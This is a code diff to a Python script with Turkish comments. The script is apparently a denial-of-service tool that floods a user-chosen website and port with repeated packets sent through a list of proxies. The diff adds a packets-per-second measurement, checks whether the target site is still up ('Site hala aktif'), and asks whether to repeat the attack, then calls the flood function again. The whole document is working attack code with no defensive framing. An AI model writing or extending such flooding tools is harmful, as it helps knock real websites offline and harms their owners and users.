@@ -12,11 +12,28 @@ def send_packets(host, port, packet_count, proxy_list):
         s.connect((proxy, port))
         
         # Paketleri gönder
+        start_time = time.time()
         data = b'PAKET'* packet_count
         s.sendall(data)
+        end_time = time.time()
+        sending_time = end_time - start_time
         
         # Bağlantıyı kapat
         s.close()
+        print("Gönderme hızı: ", packet_count/sending_time, " paket/s")
+    try:
+        response = requests.get(host)
+        if response.status_code == 200:
+            print("Site hala aktif")
+            repeat_attack = input("Tekrar saldırı yapılsın mı? (yes/no)")
+            if repeat_attack.lower() == 'yes':
+                send_packets(host, port, packet_count, proxy_list)
+            else:
+                print("Saldırı iptal edildi")
+        else:
+            print("Site kapandı")
+    except:
+        print("Siteye ulaşılamadı")
 
 host = input("Hedef website adresi: ")
 port = int(input("Hedef port numarası: "))
